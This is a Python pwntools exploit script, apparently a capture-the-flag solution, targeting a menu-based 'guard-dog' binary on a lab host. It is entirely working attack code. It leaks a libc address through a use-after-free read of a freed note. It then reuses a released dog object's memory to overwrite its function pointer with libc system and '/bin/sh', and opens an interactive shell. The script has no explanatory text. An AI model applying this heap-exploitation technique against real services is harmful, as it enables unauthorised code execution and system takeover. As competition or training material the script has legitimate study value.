#!/usr/bin/env python3
from pwn import *

PORT = 1025
HOST = "10.0.167.38"
elf = context.binary = ELF('./guard-dog_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x00000000004015D9
            b* 0x0000000000401703
            b* 0x00000000004016AF
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def menu(choice):
    p.sendlineafter(b"> ", str(choice).encode())

def adopt(idx, name):
    menu(1)
    p.sendlineafter(b"kennel", str(idx).encode())
    p.recvuntil(b"name: ")
    p.send(name.ljust(0x18, b"\x00")[:0x18])


def command(idx):
    menu(2)
    p.sendlineafter(b"kennel", str(idx).encode())


def release(idx):
    menu(3)
    p.sendlineafter(b"kennel", str(idx).encode())


def file_note(idx, size, data):
    assert len(data) == size
    menu(4)
    p.sendlineafter(b"slot", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"contents: ", data)


def read_note(idx):
    menu(5)
    p.sendlineafter(b"note slot: ", str(idx).encode())


def shred_note(idx):
    menu(6)
    p.sendlineafter(b"note slot: ", str(idx).encode())

file_note(0, 0x500, b"A" * 0x500)
file_note(1, 0x20,  b"B" * 0x20)
shred_note(0)

# GDB()
read_note(0)
p.recvuntil(b"contents: ")
data = p.recvn(0x08)
libc.address = u64(data) - 0x1ecbe0
log.info(f'libc: {hex(libc.address)}')


adopt(0, b'd1nhdwc')
release(0)

pl = flat(
    b"/bin/sh\x00".ljust(0x18, b'\x00'),
    libc.sym.system
)
file_note(2, 0x20, pl)
command(0)
p.interactive()